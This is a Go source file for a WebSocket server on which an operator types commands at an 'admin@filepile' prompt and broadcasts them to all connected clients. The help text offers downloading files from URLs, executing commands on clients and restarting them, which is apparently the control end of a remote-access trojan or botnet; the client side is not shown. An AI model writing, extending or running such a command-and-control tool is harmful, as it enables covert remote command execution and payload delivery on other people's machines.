package main

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os"
	"sync"
)

var (
	titleColor   = color.New(color.FgHiCyan, color.Bold)
	infoColor    = color.New(color.FgHiGreen)
	warningColor = color.New(color.FgHiYellow)
	errorColor   = color.New(color.FgHiRed)
	keyColor     = color.New(color.FgHiBlue)
	valueColor   = color.New(color.FgHiWhite)
)
var upgrader = websocket.Upgrader{}
var clients = make(map[*websocket.Conn]bool)
var mu sync.Mutex // 동기화를 위한 뮤텍스

func printClientCount() {
	clientCount := len(clients)
	infoColor.Printf("Connected clients: %d\n", clientCount)
}

func handleClientDisconnection(ws *websocket.Conn) {
	ws.Close()
	mu.Lock()
	delete(clients, ws)
	mu.Unlock()
	printClientCount()
}

func readClientMessages(ws *websocket.Conn) {
	defer handleClientDisconnection(ws)

	for {
		_, msg, err := ws.ReadMessage()
		if err != nil {
			log.Printf("error reading message: %v", err)
			break
		}

		// 뮤텍스 잠금으로 출력 동기화
		mu.Lock()
		fmt.Print("\r")                       // 기존 입력 지우기
		valueColor.Printf("%s\n", msg)        // 클라이언트 메시지 출력
		keyColor.Printf("admin@filepile:~$ ") // 프롬프트 다시 출력
		mu.Unlock()
	}
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Fatal(err)
		return
	}

	mu.Lock()
	clients[ws] = true
	mu.Unlock()
	printClientCount()

	go readClientMessages(ws)

	for {
		reader := bufio.NewReader(os.Stdin)
		keyColor.Printf("admin@filepile:~$ ")
		cmd, err := reader.ReadString('\n')

		if err != nil {
			log.Printf("Command input error: %v", err)
			continue
		}

		if cmd == "count\n" {
			printClientCount()
			continue
		}

		if cmd == "help\n" {
			infoColor.Println("Commands:")
			infoColor.Println("  count - Show connected clients count")
			infoColor.Println("  <url> download - Download file from URL")
			infoColor.Println("  <command> exec - execute command on client")
			infoColor.Println("  restart - Restart client")
			infoColor.Println("  test - Test command")
			infoColor.Println("  exit - Close server")
			continue
		}

		if cmd == "exit\n" {
			infoColor.Println("Closing server...")
			os.Exit(0)
		}

		mu.Lock()
		for client := range clients {
			err = client.WriteMessage(websocket.TextMessage, []byte(cmd))
			if err != nil {
				log.Printf("error sending command: %v", err)
				handleClientDisconnection(client)
			}
		}
		mu.Unlock()
	}
}

func main() {
	http.HandleFunc("/ws", handleConnections)
	titleColor.Println(" _            _   \n| |_ ___  ___| |_ \n| __/ _ \\/ __| __|\n| ||  __/\\__ \\ |_ \n \\__\\___||___/\\__|\n                  ")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
